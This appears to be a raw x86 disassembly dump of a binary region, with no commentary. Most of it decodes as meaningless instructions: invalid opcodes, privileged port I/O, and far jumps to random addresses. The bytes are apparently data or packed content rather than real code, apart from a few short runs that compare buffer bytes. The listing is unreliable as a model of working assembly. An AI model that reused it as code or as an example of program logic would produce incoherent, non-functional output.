  404173:	xchg   edi,eax
  404174:	jo     0x40417d
  404176:	mov    fs,WORD PTR [ecx+0x796c3a95]
  40417c:	sbb    al,0xbc
  40417e:	loopne 0x4041c7
  404180:	mov    DWORD PTR [edx-0x1f],edi
  404183:	cmc    
  404184:	imul   DWORD PTR [edi+ebp*1+0x25168d1f]
  40418b:	jns    0x404127
  40418d:	jge    0x404200
  40418f:	push   0x6f
  404191:	push   0x81ba4d70
  404196:	mov    ebp,0x9540c180
  40419b:	lea    ecx,[edx-0x25]
  40419e:	or     ebp,esi
  4041a0:	xchg   esi,eax
  4041a1:	adc    BYTE PTR [ecx],ah
  4041a3:	and    eax,0xd32ad485
  4041a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041a9:	imul   edi,ebp,0x60
  4041ac:	std    
  4041ad:	dec    ebx
  4041ae:	int3   
  4041af:	adc    eax,0xc80414f0
  4041b4:	dec    eax
  4041b5:	out    0x2,al
  4041b7:	inc    ebx
  4041b8:	psllq  mm3,QWORD PTR [ecx+0x4a]
  4041bc:	cwde   
  4041bd:	push   0xe460d0ae
  4041c2:	pop    ss
  4041c3:	lds    eax,FWORD PTR [esi-0x301e4c65]
  4041c9:	outs   dx,BYTE PTR ds:[esi]
  4041ca:	ret    
  4041cb:	(bad)  
  4041cc:	jns    0x4041ff
  4041ce:	into   
  4041cf:	pop    ecx
  4041d0:	and    ecx,DWORD PTR [edx+0x10]
  4041d3:	add    BYTE PTR [eax+eiz*4-0x1],cl
  4041d7:	or     eax,0x958ebfa0
  4041dc:	push   edi
  4041dd:	mov    bl,0xc2
  4041df:	ins    DWORD PTR es:[edi],dx
  4041e0:	fwait
  4041e1:	es mov al,0xa6
  4041e4:	les    esi,FWORD PTR [esi+edi*8]
  4041e7:	lods   al,BYTE PTR ds:[esi]
  4041e8:	stos   DWORD PTR es:[edi],eax
  4041e9:	cwde   
  4041ea:	les    ecx,FWORD PTR [ecx*4-0x4fc2cb73]
  4041f1:	shr    DWORD PTR [edx],cl
  4041f3:	push   esi
  4041f4:	mov    dh,0x53
  4041f6:	add    esp,eax
  4041f8:	pop    edx
  4041f9:	xor    DWORD PTR [edx-0x3a25f994],edx
  4041ff:	shr    BYTE PTR [edi+0x77322af9],cl
  404205:	popa   
  404206:	xchg   ecx,eax
  404207:	gs pop ss
  404209:	sub    ebp,DWORD PTR [esi]
  40420b:	inc    eax
  40420c:	add    DWORD PTR [ecx+0x44fd5dc3],edx
  404212:	hlt    
  404213:	imul   DWORD PTR [eax]
  404215:	gs aas 
  404217:	push   cs
  404218:	lea    eax,es:[esi-0x1d88ffb3]
  40421f:	imul   esi,DWORD PTR [ecx+0x75],0x87f6115
  404226:	mov    esp,0x78629100
  40422b:	ins    DWORD PTR es:[edi],dx
  40422c:	scas   eax,DWORD PTR es:[edi]
  40422d:	sbb    DWORD PTR [ecx],ebp
  40422f:	pop    es
  404230:	mov    WORD PTR gs:[ecx],fs
  404233:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404234:	inc    eax
  404235:	std    
  404236:	outs   dx,BYTE PTR ds:[esi]
  404237:	sub    DWORD PTR [ecx*2+0x1e695c31],ecx
  40423e:	sbb    ah,BYTE PTR [ebp+esi*2+0x64]
  404242:	mov    ecx,0x835936a6
  404247:	repnz mov edi,0x59db4ca7
  40424d:	ins    DWORD PTR es:[edi],dx
  40424e:	aam    0xa8
  404250:	jbe    0x40428e
  404252:	mul    DWORD PTR [ecx]
  404254:	inc    edx
  404255:	push   0x38
  404257:	inc    esi
  404258:	in     eax,0xc0
  40425a:	mov    BYTE PTR [ebx-0x80],ch
  40425d:	inc    ebp
  40425e:	retf   0x4c37
  404261:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404262:	clc    
  404263:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404264:	mov    eax,ds:0x9fe8bf1d
  404269:	jle    0x4042e4
  40426b:	lods   al,BYTE PTR ds:[esi]
  40426c:	fwait
  40426d:	mov    bl,0x27
  40426f:	mov    ebp,0xdae27aa5
  404274:	rol    BYTE PTR [ecx+0x3526cfcf],1
  40427a:	out    0x77,eax
  40427c:	jle    0x4042c4
  40427e:	adc    ch,BYTE PTR [ecx+esi*4+0x25]
  404282:	repnz ficom WORD PTR [eax]
  404285:	cmp    edx,eax
  404287:	ss pop edi
  404289:	dec    edx
  40428a:	js     0x404230
  40428c:	xchg   esi,eax
  40428d:	mov    ds:0xc3714d83,eax
  404292:	mov    eax,ds:0x9af2d3fe
  404297:	and    BYTE PTR [esi-0x59],0x2
  40429b:	shl    DWORD PTR [ebx],1
  40429d:	inc    ebp
  40429e:	add    DWORD PTR [ecx+0x1e],0xc887f978
  4042a5:	fstp   DWORD PTR [ebx+0x42]
  4042a8:	mov    al,ds:0xfba255c5
  4042ad:	dec    ebp
  4042ae:	into   
  4042af:	xchg   edi,eax
  4042b0:	shr    BYTE PTR [eax-0x4a3ba43e],cl
  4042b6:	jge    0x4042ed
  4042b8:	popa   
  4042b9:	xchg   BYTE PTR [eax-0x2c63fe6d],cl
  4042bf:	lea    edi,[esp+esi*8+0x27d29b12]
  4042c6:	mov    al,0x8d
  4042c8:	jo     0x4042a9
  4042ca:	xor    ah,cl
  4042cc:	xchg   edi,eax
  4042cd:	(bad)  
  4042ce:	and    al,0x13
  4042d0:	popa   
  4042d1:	push   edx
  4042d2:	pmulhw mm5,mm4
  4042d5:	push   esi
  4042d6:	xor    BYTE PTR [esi-0x2a],ah
  4042d9:	cmp    al,0xb6
  4042db:	jmp    0xbbfb:0xe8eebca3
  4042e2:	call   0xd028:0xf988c57f
  4042e9:	fldenv [edx]
  4042eb:	out    dx,al
  4042ec:	and    eax,0xf25ee738
  4042f1:	mov    ds:0x8eda58c,eax
  4042f6:	xchg   ebx,eax
  4042f7:	aaa    
  4042f8:	cmp    al,0xa2
  4042fa:	aaa    
  4042fb:	rcr    BYTE PTR ds:0x7b99cccb,cl
  404301:	ret    
  404302:	jo     0x4042d9
  404304:	aas    
  404305:	mov    dl,0x68
  404307:	shl    DWORD PTR [edx+0x3e1319e4],1
  40430d:	dec    ebp
  40430e:	inc    esi
  40430f:	push   ds
  404310:	mov    eax,ds:0xdb58ebc1
  404315:	jecxz  0x4042aa
  404317:	cmp    eax,edi
  404319:	ss fs jne 0x404325
  40431d:	mov    eax,ds:0x5dafa0eb
  404322:	xor    bl,BYTE PTR [edx+0x22b90413]
  404328:	sub    edi,DWORD PTR [eax-0x1e]
  40432b:	dec    ebp
  40432c:	xor    bh,BYTE PTR [ebx+eiz*2]
  40432f:	fst    st(5)
  404331:	sahf   
  404332:	js     0x404319
  404334:	js     0x40433a
  404336:	imul   ebp,DWORD PTR ds:0x7aeb9d88,0x927a950b
  404340:	hlt    
  404341:	mov    esp,esp
  404343:	push   ebp
  404344:	iret   
  404345:	nop
  404346:	mov    ebx,0x161247ee
  40434b:	or     ebx,edi
  40434d:	push   0x3df0ddd6
  404352:	fstp   QWORD PTR [edx+0x6d6a0fc5]
  404358:	jg     0x404303
  40435a:	nop
  40435b:	mov    edx,0xbf72c09b
  404360:	push   es
  404361:	push   esp
  404362:	inc    ebx
  404363:	xor    al,0xdf
  404365:	inc    ecx
  404366:	dec    eax
  404367:	dec    ecx
  404368:	push   esp
  404369:	jge    0x4042ef
  40436b:	mov    bh,0x7f
  40436d:	xchg   esi,eax
  40436e:	cmp    eax,0xe41936ae
  404373:	aam    0xd2
  404375:	xchg   edx,eax
  404376:	jno    0x40437c
  404378:	xchg   ebx,eax
  404379:	dec    ebx
  40437a:	lds    esi,FWORD PTR [ebp+0x25]
  40437d:	cld    
  40437e:	in     eax,dx
  40437f:	rep lods al,BYTE PTR ds:[esi]
  404381:	repnz hlt 
  404383:	xor    dl,ah
  404385:	dec    ebx
  404386:	aam    0xe
  404388:	jbe    0x404376
  40438a:	mov    edi,0x33a136a8
  40438f:	cmp    bl,0x5d
  404392:	adc    DWORD PTR [ecx],esi
  404394:	hlt    
  404395:	mov    BYTE PTR [esi+ebx*4],ch
  404398:	fild   WORD PTR [edi+ecx*8]
  40439b:	(bad)  
  40439c:	lock aam 0x33
  40439f:	(bad)  
  4043a0:	addr16 cmc 
  4043a2:	and    eax,0x7557ce1f
  4043a7:	neg    DWORD PTR [edi]
  4043a9:	or     DWORD PTR [edx+0x4e],ebp
  4043ac:	inc    eax
  4043ad:	leave  
  4043ae:	inc    edx
  4043af:	mov    ds:0x82e82802,al
  4043b4:	lea    edx,[eax+edx*4]
  4043b7:	mov    DWORD PTR [eax],ecx
  4043b9:	adc    dh,dh
  4043bb:	xor    esi,0xffffffb2
  4043be:	sbb    DWORD PTR [edi+0x7c],0x6d
  4043c2:	and    ah,BYTE PTR [ebx-0x28]
  4043c5:	out    dx,eax
  4043c6:	and    al,BYTE PTR [eax]
  4043c8:	dec    edi
  4043c9:	(bad)  
  4043ca:	lock je 0x40438a
  4043cd:	pop    edi
  4043ce:	es sbb eax,0x8d655c87
  4043d4:	retf   
  4043d5:	fnsave [eax]
  4043d7:	outs   dx,DWORD PTR ds:[esi]
  4043d8:	pop    edx
  4043d9:	dec    eax
  4043da:	add    DWORD PTR [ebx-0x29],ebx
  4043dd:	mov    al,0x40
  4043df:	test   al,0x87
  4043e1:	rol    BYTE PTR [ebx+0x44],1
  4043e4:	cmp    DWORD PTR [ebx],ebx
  4043e6:	pop    es
  4043e7:	out    0xaa,al
  4043e9:	push   edx
  4043ea:	cmp    al,0x21
  4043ec:	shl    DWORD PTR [ebx+0x497df1],1
  4043f2:	mov    eax,0xe66bea1b
  4043f7:	in     eax,0xb0
  4043f9:	arpl   ax,dx
  4043fb:	outs   dx,DWORD PTR ds:[esi]
  4043fc:	inc    ebx
  4043fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043fe:	popf   
  4043ff:	or     al,0x69
  404401:	jecxz  0x40440d
  404403:	ret    
  404404:	(bad)  
  404405:	test   al,0x4a
  404407:	(bad)
  40440c:	fs dec ebp
  40440e:	enter  0x9379,0xe3
  404412:	add    al,0xbd
  404414:	dec    eax
  404415:	mov    es,WORD PTR [edi+0x76]
  404418:	dec    esi
  404419:	mov    dh,0xe8
  40441b:	in     eax,0xdc
  40441d:	jl     0x4043e6
  40441f:	(bad)  
  404420:	in     al,dx
  404421:	pop    ds
  404422:	repnz adc BYTE PTR [eax+0x1d],0x68
  404427:	fcmove st,st(1)
  404429:	jne    0x4044a9
  40442b:	out    dx,al
  40442c:	push   0xd49c544f
  404431:	sub    eax,0x8dece6e1
  404436:	(bad)  
  404437:	scas   al,BYTE PTR es:[edi]
  404438:	hlt    
  404439:	imul   ebp,DWORD PTR [ecx+0x41],0x1c3d1345
  404440:	test   al,0x74
  404442:	xor    DWORD PTR [esi+ebx*1+0x2ade16ee],edx
  404449:	mov    al,ds:0xb7826310
  40444e:	leave  
  40444f:	fdiv   QWORD PTR [ebx-0x3011bcb3]
  404455:	and    eax,0xcedf8356
  40445a:	jnp    0x4043ef
  40445c:	add    BYTE PTR [ebx+0x2f652585],al
  404462:	data16 cmp BYTE PTR [eax-0x24fe547f],0x3b
  40446a:	mov    fs,WORD PTR [eax]
  40446c:	xor    edx,ebp
  40446e:	popf   
  40446f:	dec    edi
  404470:	loop   0x404419
  404472:	mov    eax,0xb06be332
  404477:	push   esp
  404478:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404479:	push   ss
  40447a:	add    ch,BYTE PTR [edx-0x7911a0fe]
  404480:	adc    esi,ecx
  404482:	hlt    
  404483:	cmp    al,BYTE PTR [ebp+0x2e6f6046]
  404489:	rcl    BYTE PTR [esi+0x24728c2d],1
  40448f:	sahf   
  404490:	inc    ecx
  404491:	xor    ebx,0x63ec5d5a
  404497:	ins    DWORD PTR es:[edi],dx
  404498:	and    edi,DWORD PTR [ebx-0x52]
  40449b:	ss nop
  40449d:	scas   al,BYTE PTR es:[edi]
  40449e:	and    al,0x4c
  4044a0:	jo     0x40447c
  4044a2:	mov    ebp,0xbef8bf0f
  4044a7:	mov    al,0x17
  4044a9:	cs cmp al,0x1a
  4044ac:	jl     0x4044dd
  4044ae:	and    DWORD PTR [eax+0x16804402],edx
  4044b4:	into   
  4044b5:	mov    ?,WORD PTR [ecx+0x50dcbc65]
  4044bb:	mov    edx,0xa6404fc2
  4044c0:	inc    ecx
  4044c1:	out    dx,eax
  4044c2:	sar    bl,cl
  4044c4:	fimul  WORD PTR [ecx+0x43]
  4044c7:	mov    WORD PTR [ebp+0x55],ss
  4044ca:	inc    esi
  4044cb:	adc    al,0x29
  4044cd:	mov    bh,0x66
  4044cf:	les    ecx,FWORD PTR [edx-0x7557fabc]
  4044d5:	push   ebp
  4044d6:	(bad)  
  4044d7:	cmp    al,dl
  4044d9:	je     0x404d06
  4044df:	mov    eax,DWORD PTR [ebp+0x8]
  4044e2:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4044e6:	mov    edx,DWORD PTR [ebp+0xc]
  4044e9:	cmp    al,BYTE PTR [edx]
  4044eb:	jne    0x404d2c
  4044f1:	mov    eax,DWORD PTR [ebp-0x8]
  4044f4:	mov    edx,DWORD PTR [ebp+0xc]
  4044f7:	movsx  edx,BYTE PTR [edx]
  4044fa:	jmp    0x4048ef
  4044ff:	enter  0xe53f,0x49
  404503:	cmc    
  404504:	jne    0x40457a
  404506:	mov    edi,0x8f3c5193
  40450b:	sub    al,0xd3
  40450d:	icebp  
  40450e:	retf   0x27eb
  404511:	jle    0x404591
  404513:	push   esi
  404514:	jns    0x404594
  404516:	jle    0x404526
  404518:	cmp    ebp,DWORD PTR [edx]
  40451a:	or     al,0x92
  40451c:	adc    al,0x74
  40451e:	dec    ebx
  40451f:	push   esi
  404520:	cmp    al,0x21
  404522:	or     DWORD PTR gs:[esi],ebp
  404525:	std    
  404526:	int3   
  404527:	mov    bh,cl
  404529:	sub    dl,BYTE PTR [eax]
  40452b:	lods   al,BYTE PTR ds:[esi]
  40452c:	pop    esp
  40452d:	xchg   esp,eax
  40452e:	call   0x9ff5:0xf03d8887
  404535:	dec    edi
  404536:	sti    
  404537:	fucom  st(0)
  404539:	pop    edi
  40453a:	out    dx,eax
  40453b:	sub    eax,0x70c1b537
  404540:	repnz pop ss
  404542:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404543:	inc    esp
  404544:	lsl    edi,di
  404547:	add    dh,BYTE PTR [ebp+0x26]
  40454a:	in     al,0x53
  40454c:	push   0xba80912e
  404551:	pop    edi
  404552:	rol    BYTE PTR [ebx-0x4459d2cf],1
  404558:	push   ecx
  404559:	mov    DWORD PTR [ebx+0x42],edi
  40455c:	nop
  40455d:	xor    ecx,DWORD PTR ds:0xc2ae016e
  404563:	inc    eax
  404564:	mov    eax,ds:0xcc641af4
  404569:	xor    al,cl
  40456b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40456c:	ss jecxz 0x4045e8
  40456f:	arpl   WORD PTR [ecx-0x4d8c5c1c],bx
  404575:	rcr    DWORD PTR [edx+0x70],0xfc
  404579:	add    DWORD PTR [edx+0x60c0ffac],esi
  40457f:	pop    edi
  404580:	cmp    DWORD PTR [ecx+0x53],0x23396986
  404587:	dec    ebp
  404588:	retf   0xdc64
  40458b:	mov    cl,0x42
  40458d:	mov    ebx,esi
  40458f:	adc    al,0xc8
  404591:	pop    ds
  404592:	adc    edx,ebx
  404594:	xchg   esp,eax
  404595:	mov    dh,0x38
  404597:	(bad)  
  404598:	cmp    esp,DWORD PTR [edi]
  40459a:	mov    cl,0xfc
  40459c:	int    0x7a
  40459e:	adc    al,0xb3
  4045a0:	daa    
  4045a1:	xchg   edi,eax
  4045a2:	fwait
  4045a3:	sti    
  4045a4:	or     DWORD PTR [esi],ebx
  4045a6:	adc    eax,0x3cc6443a
  4045ab:	push   es
  4045ac:	leave  
  4045ad:	sbb    esi,DWORD PTR [eax]
  4045af:	sti    
  4045b0:	xchg   ecx,eax
  4045b1:	and    DWORD PTR [esi],edx
  4045b3:	jg     0x4045b4
  4045b5:	nop
  4045b6:	xchg   ecx,eax
  4045b7:	ja     0x4045da
  4045b9:	adc    dh,BYTE PTR [ebx+0x51bab040]
  4045bf:	rcr    DWORD PTR [ebx-0x31042b2b],1
  4045c5:	(bad)  
  4045c6:	mov    eax,0x9ab5752a
  4045cb:	jb     0x4045f8
  4045cd:	jne    0x4045a9
  4045cf:	xchg   ebp,eax
  4045d0:	arpl   WORD PTR ds:0x386f392e,cx
  4045d6:	pushf  
  4045d7:	scas   eax,DWORD PTR es:[edi]
  4045d8:	icebp  
  4045d9:	jge    0x404635
  4045db:	or     DWORD PTR [edx-0x32],0xffffff89
  4045df:	jmp    0x9396:0xa36000b3
  4045e6:	pop    es
  4045e7:	int    0x8b
  4045e9:	push   edi
  4045ea:	adc    cl,ah
  4045ec:	aaa    
  4045ed:	fisub  DWORD PTR [esp+eax*4-0x1b]
  4045f1:	or     BYTE PTR [ecx-0x11da931],0x88
  4045f8:	mov    eax,DWORD PTR ds:0x1a6e75f7
  4045fe:	push   ecx
  4045ff:	mov    ds:0xc546ef0b,al
  404604:	retf   
  404605:	dec    eax
  404606:	cmc    
  404607:	mov    ch,0x61
  404609:	xchg   ebp,eax
  40460b:	test   al,0x5f
  40460e:	mov    ecx,0x157c9da9
  404613:	inc    edi
  404614:	imul   edx,DWORD PTR [edx-0x1b5c63d6],0x32e308a0
  40461e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40461f:	cli    
  404620:	in     al,dx
  404621:	adc    eax,0xfac4f22
  404626:	mov    WORD PTR [ebp+0x24eaaa7a],?
  40462c:	pop    edx
  40462d:	lods   eax,DWORD PTR ds:[esi]
  40462e:	jecxz  0x404698
  404630:	stc    
  404631:	pop    ebp
  404632:	jl     0x404632
  404634:	and    al,0x8f
  404636:	dec    ecx
  404637:	or     eax,0xbd098dd5
  40463c:	cmp    esi,eax
  40463e:	sub    eax,0x9eba8d41
  404643:	mov    ebp,0xd198d853
  404648:	adc    ecx,DWORD PTR [edx]
  40464a:	jb     0x404699
  40464c:	in     eax,0x5f
  40464e:	(bad)  
  40464f:	fs popa 
  404651:	js     0x404652
  404653:	and    ch,0x1c
  404656:	loopne 0x40469b
  404658:	push   edi
  404659:	arpl   WORD PTR fs:[edx-0xea22363],ax
  404660:	fs js  0x40465c
  404663:	mov    BYTE PTR ds:0xee704ca1,cl
  404669:	xlat   BYTE PTR ds:[ebx]
  40466a:	mov    ds:0x914f78bb,eax
  40466f:	sbb    edx,DWORD PTR [ebp-0x2c]
  404672:	cmp    BYTE PTR [esi-0x241c7710],dl
  404678:	adc    esi,ebx
  40467a:	stc    
  40467b:	xchg   edx,eax
  40467c:	xchg   esi,eax
  40467d:	retf   
  40467e:	mov    ebx,0x8138f757
  404683:	test   BYTE PTR [ebp+0x34dd56fa],0x5
  40468a:	shl    ebx,0xd2
  40468d:	cmp    BYTE PTR [ebx-0x583fdb71],cl
  404693:	xchg   ebx,eax
  404694:	out    0xc4,eax
  404696:	clc    
  404697:	mov    edi,0xba54e866
  40469c:	and    ebx,ebx
  40469e:	sub    eax,0x15add438
  4046a3:	add    al,0x52
  4046a5:	jo     0x4046d7
  4046a7:	xor    al,0x3
  4046a9:	lahf   
  4046aa:	inc    esi
  4046ab:	push   es
  4046ac:	(bad)  
  4046ad:	repz das 
  4046af:	int    0xed
  4046b1:	cmp    dl,BYTE PTR [ecx-0x4d597256]
  4046b7:	ins    BYTE PTR es:[edi],dx
  4046b8:	cmp    al,0x3d
  4046ba:	fcomi  st,st(6)
  4046bc:	push   edx
  4046bd:	mov    dl,0xcd
  4046bf:	shl    BYTE PTR [ecx],1
  4046c1:	out    dx,eax
  4046c2:	mov    ebx,0xa30baa70
  4046c7:	mov    edi,0xe077e3f4
  4046cc:	jmp    0xd995:0xe5fb24da
  4046d3:	pop    es
  4046d4:	xor    dh,al
  4046d6:	imul   esp,ebp,0x2d
  4046d9:	hlt    
  4046da:	das    
  4046db:	mov    WORD PTR [edi+0x3f],?
  4046de:	clc    
  4046df:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4046e1:	jb     0x404665
  4046e3:	loope  0x4046d4
  4046e5:	jo     0x4046ee
  4046e7:	and    dh,BYTE PTR [edx+0x24d5c4e8]
  4046ed:	jae    0x4046fb
  4046ef:	or     al,0x5c
  4046f1:	adc    al,0x7f
  4046f3:	aas    
  4046f4:	jne    0x4046de
  4046f6:	out    dx,eax
  4046f7:	je     0x40474d
  4046f9:	les    ecx,FWORD PTR [edx+0x77210de5]
  4046ff:	in     al,0x10
  404701:	setg   BYTE PTR [edi]
  404704:	xlat   BYTE PTR ds:[ebx]
  404705:	mov    ebx,0x2a5a7099
  40470a:	and    BYTE PTR [ecx+0x279a76e],cl
  404710:	in     al,0x9c
  404712:	dec    esp
  404713:	pop    esp
  404714:	mov    BYTE PTR [ecx+edi*4],al
  404717:	cdq    
  404718:	retf   
  404719:	and    DWORD PTR [edx-0x4d],esp
  40471c:	call   0x69b9:0x1921
  404722:	test   DWORD PTR [esi],eax
  404724:	or     BYTE PTR [ecx+0x38],al
  404727:	inc    esp
  404728:	pop    ebx
  404729:	jno    0x70a91943
  40472f:	adc    bh,BYTE PTR [ebp+0x7c]
  404732:	fiadd  WORD PTR [esi+edi*1+0x61]
  404736:	jle    0x404715
  404738:	sub    DWORD PTR [edi+0x48ad8c19],edx
  40473e:	or     ebp,DWORD PTR [esi]
  404740:	pop    ebp
  404741:	aaa    
  404742:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404743:	inc    ecx
  404744:	or     cl,BYTE PTR [ebp-0x4a3c00f]
  40474a:	xchg   esi,eax
  40474b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40474c:	sub    ah,BYTE PTR [ecx-0x13]
  40474f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404750:	jecxz  0x404757
  404752:	and    BYTE PTR [eax],0x54
  404755:	in     al,dx
  404756:	cmovb  edx,DWORD PTR [edi-0x71]
  40475a:	fstp   QWORD PTR [ecx+0x1d]
  40475d:	mov    ch,0xcf
  40475f:	pushf  
  404760:	pop    es
  404761:	lods   al,BYTE PTR ds:[esi]
  404762:	jmp    0x404756
  404764:	popa   
  404765:	inc    ecx
  404766:	mov    al,0xcc
  404768:	push   esi
  404769:	cmp    edx,DWORD PTR [edi+0x1293f2e9]
  40476f:	mov    al,ds:0x8996df35
  404774:	dec    edx
  404775:	das    
  404776:	aam    0x7e
  404778:	je     0x40471c
  40477a:	xor    esp,DWORD PTR [eax-0x288cf15a]
  404780:	xor    al,0x20
  404782:	(bad)  
  404783:	mov    ds:0x266c853b,eax
  404788:	or     edx,DWORD PTR [ebx-0x3ec068c4]
  40478e:	jp     0x404726
  404790:	pop    esp
  404791:	daa    
  404792:	dec    ebp
  404793:	add    DWORD PTR [edx-0x7826bf4c],edx
  404799:	or     eax,0x70d76ae8
  40479e:	mov    al,0xe4
  4047a0:	ret    0x85e3
  4047a3:	sbb    DWORD PTR ds:0x5af7da6,ecx
  4047a9:	mov    ds:0xb98dbc3c,eax
  4047ae:	(bad)  
  4047af:	jns    0x404817
  4047b1:	jb     0x404740
  4047b3:	ja     0x4047c6
  4047b5:	mov    ah,0x3c
  4047b7:	stos   BYTE PTR es:[edi],al
  4047b8:	pushf  
  4047b9:	test   al,0xb4
  4047bb:	mov    esi,0xa01354b9
  4047c0:	mov    ecx,0xe32d3620
  4047c5:	add    dh,BYTE PTR [ebx+0x3a88d728]
  4047cb:	mov    edi,0x87263704
  4047d0:	jne    0x4047da
  4047d2:	sbb    ebx,DWORD PTR [eax+0x60]
  4047d5:	mov    ecx,0xeae19380
  4047da:	cld    
  4047db:	sub    al,0x9a
  4047dd:	mov    cl,BYTE PTR [eax-0x61114d65]
  4047e3:	inc    ebx
  4047e4:	mov    ecx,0x6888ba4
  4047e9:	mov    edi,0xef89260f
  4047ee:	mov    ebx,0x1c07a112
  4047f3:	in     al,0x9d
  4047f5:	adc    eax,DWORD PTR [ecx+eiz*2]
  4047f8:	sub    ebx,DWORD PTR [ecx]
  4047fa:	dec    esp
  4047fb:	mov    WORD PTR [edi+0x34],ds
  4047fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047ff:	cmp    eax,DWORD PTR [edx-0x74]
  404802:	jbe    0x4047fc
  404804:	push   eax
  404805:	add    ebx,DWORD PTR [edi+0xe020ef7]
  40480b:	lock hlt 
  40480d:	iret   
  40480e:	xchg   esi,eax
  40480f:	sub    DWORD PTR [eax-0x24],eax
  404812:	sti    
  404813:	ds push es
  404815:	int    0x51
  404817:	push   edx
  404818:	dec    ecx
  404819:	jno    0x4047a6
  40481b:	ins    BYTE PTR es:[edi],dx
  40481c:	xchg   ebx,eax
  40481d:	push   0x1eaa46e1
  404822:	pop    ss
  404823:	jns    0x40484d
  404825:	xchg   ebx,eax
  404826:	xor    DWORD PTR ds:0x3e064196,esi
  40482c:	ret    0x8333
  40482f:	add    al,BYTE PTR ds:0x420f5db6
  404835:	add    eax,DWORD PTR [edx-0x1]
  404838:	jecxz  0x4047c5
  40483a:	ret    
  40483b:	out    0xb2,eax
  40483d:	xchg   esi,eax
  40483e:	sar    ecx,cl
  404840:	loope  0x404823
  404842:	push   esi
  404843:	lahf   
  404844:	int3   
  404845:	add    esp,DWORD PTR [eax+eiz*4]
  404848:	mov    al,ds:0x1b1fa8c2
  40484d:	ret    0x367f
  404850:	xchg   edi,eax
  404851:	push   edx
  404852:	scas   eax,DWORD PTR es:[edi]
  404853:	jecxz  0x4047fc
  404855:	ss out 0x24,eax
  404858:	mov    dh,0x6b
  40485a:	das    
  40485b:	pop    ss
  40485c:	adc    al,0x32
  40485e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40485f:	or     ecx,DWORD PTR [edx-0x56fa9b98]
  404865:	jns    0x4047f7
  404867:	popf   
  404868:	inc    edx
  404869:	pop    esi
  40486a:	mov    edx,0xb987f346
  40486f:	pop    esi
  404870:	mov    dl,0x92
  404872:	jl     0x4048ab
  404874:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404875:	xchg   ebp,eax
  404876:	mov    bx,0xe816
  40487a:	sbb    al,BYTE PTR [edx]
  40487c:	xchg   edx,ebx
  40487e:	adc    al,cl
  404880:	xchg   ebx,eax
  404881:	mov    eax,ds:0xef2f98a7
  404886:	popa   
  404887:	inc    eax
  404888:	fidiv  WORD PTR [esi-0x146b3a86]
  40488e:	inc    BYTE PTR [ebp+0x62c98be1]
  404894:	push   eax
  404895:	fist   DWORD PTR [esi-0x6a0a8eae]
  40489b:	pop    ds
  40489c:	jo     0x4048bb
  40489e:	and    cl,BYTE PTR [esi+0x53]
  4048a1:	ds js  0x404886
  4048a4:	xchg   esi,eax
  4048a5:	xchg   edi,eax
  4048a6:	add    BYTE PTR [eax+edx*2+0x57],dl
  4048aa:	fstp   DWORD PTR [edi-0x38243d52]
  4048b0:	sbb    edx,edi
  4048b2:	gs push edi
  4048b4:	(bad)  
  4048b6:	mov    ebx,0xe314133b
  4048bb:	nop
  4048bc:	jo     0x4048d6
  4048be:	jmp    0xb16c01eb
  4048c3:	jecxz  0x404856
  4048c5:	mov    ch,0x2d
  4048c7:	sub    BYTE PTR [ebx],al
  4048c9:	mov    eax,ds:0x17d1a1da
  4048ce:	scas   al,BYTE PTR es:[edi]
  4048cf:	retf   0x560e
  4048d2:	adc    ebx,DWORD PTR [ebx-0xe]
  4048d5:	sahf   
  4048d6:	leave  
  4048d7:	mov    bh,al
  4048d9:	outs   dx,DWORD PTR ds:[esi]
  4048da:	int3   
  4048db:	test   BYTE PTR [edx],al
  4048dd:	mov    edi,0x31e8bb66
  4048e2:	sbb    ecx,edx
  4048e4:	loop   0x4048b9
  4048e6:	(bad)  
  4048e7:	outs   dx,DWORD PTR ds:[esi]
  4048e8:	int3   
  4048e9:	jle    0x404920
  4048eb:	dec    esi
  4048ec:	push   ecx
  4048ed:	mov    WORD PTR [eax],ss
  4048ef:	xor    eax,ecx
  4048f1:	add    eax,esi
  4048f3:	cmp    edx,eax
  4048f5:	je     0x404d20
  4048fb:	mov    DWORD PTR [ebp-0x18],0x705fd8c
  404902:	lea    eax,[ebp-0x18]
  404905:	mov    DWORD PTR [ebp-0x14],eax
  404908:	jmp    0x404cfd
  40490d:	push   ecx
  40490e:	(bad)  
  40490f:	fdivrp st(4),st
  404911:	imul   edi,esp,0xff19635d
  404917:	mov    esi,esi
  404919:	cmp    BYTE PTR [ebp+0x23c33f3f],0x7e
  404920:	jle    0x404978
  404922:	jns    0x4049a2
  404924:	jle    0x4048ec
  404926:	xchg   esp,eax
  404927:	mov    eax,ds:0xdd8debb4
  40492c:	sbb    DWORD PTR [ebp-0x44],edx
  40492f:	dec    edi
  404930:	vpsadbw xmm5,xmm4,xmm7
  404934:	xor    DWORD PTR [ebx],eax
  404936:	sahf   
  404937:	div    esi
  404939:	mov    WORD PTR [ebx-0x2d],gs
  40493c:	(bad)  
  40493d:	and    DWORD PTR [eax+0x39eb4b5],edi
  404943:	dec    esp
  404944:	xchg   esi,eax
  404945:	jnp    0x40496c
  404947:	mov    esi,0x7f4c4192
  40494c:	xor    edx,0xffffff9f
  40494f:	sub    ecx,DWORD PTR [ebx-0x3b]
  404952:	les    edx,FWORD PTR [eax+0x469d8afc]
  404958:	sbb    eax,DWORD PTR [ebp-0x64f136]
  40495e:	adc    eax,0x1fe8f93c
  404963:	inc    edi
  404964:	inc    ebx
  404965:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404966:	clc    
  404967:	adc    eax,0x706cc613
